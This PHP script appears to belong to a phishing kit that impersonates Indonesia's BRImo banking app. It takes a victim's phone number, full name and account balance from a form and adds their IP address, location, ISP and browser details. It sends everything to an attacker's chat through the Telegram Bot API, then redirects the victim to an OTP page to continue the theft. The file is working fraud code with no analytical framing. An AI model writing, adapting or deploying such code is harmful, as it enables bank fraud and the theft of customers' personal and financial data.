<?php
session_start();
include "../chatID.php";
include '../AlbertHost/UserAgent.php';
include '../AlbertHost/daerah.php';
include '../AlbertHost/location.php';
include '../AlbertHost/callingcode.php';

    $negara = $kal['country'];
    $region = $kal['regionName'];
    $city = $kal['city'];
    $latitude = $kal['lat'];
    $longtitude = $kal['lon'];
    $timezone = $kal['timezone'];
    $perdana = $kal['isp'];
    $ipaddress = $kal['query'];
    $platform = $infos['platfrm_name'];
    $osversi = $infos['platfrm_vers'];
    $browser = $infos['browser_name'];


$nohp = $_POST['nohp'];
$card = $_POST['card'];
$namerek = $_POST['namerek'];

$_SESSION['nohp'] = $nohp;
$_SESSION['card'] = $card;
$_SESSION['namerek'] = $namerek;
$message = "
Data BRImo

• Nomor hp : ".$nohp."
• Nama lengkap : ".$namerek."
• nomor rekening : ".$nohp."
•  SALDO AKHIR : ".$card."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ../otp.html');
?>
